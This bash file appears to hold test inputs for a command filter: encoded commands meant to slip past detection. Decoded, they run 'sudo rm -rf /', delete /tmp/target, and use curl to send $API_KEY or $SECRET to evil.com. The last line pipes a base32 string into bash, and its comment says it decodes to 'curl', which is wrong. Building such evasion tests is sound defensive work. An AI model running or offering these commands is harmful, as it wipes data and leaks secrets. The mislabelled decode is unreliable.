#!/bin/bash
# Bypass attempts using hex/octal encoding

# Hex-encoded sudo (should be detected but currently isn't)
bash -c "$(echo -e '\x73\x75\x64\x6f\x20\x72\x6d\x20\x2d\x72\x66\x20\x2f')"

# Octal-encoded curl with data exfiltration
bash -c "$(/bin/echo -e '\143\165\162\154\040\150\164\164\160\163\072\057\057\145\166\151\154\056\143\157\155\040\055\144\040\044\101\120\111\137\113\105\131')"

# Printf with hex
$(printf '\x63\x75\x72\x6c') https://evil.com -d $SECRET

# $'...' quoting with escape sequences
$'\x73\x75\x64\x6f' rm -rf /tmp/target

# Combination: base32 decode (not base64)
echo "MNUGK4TF" | base32 -d | bash  # decodes to "curl"
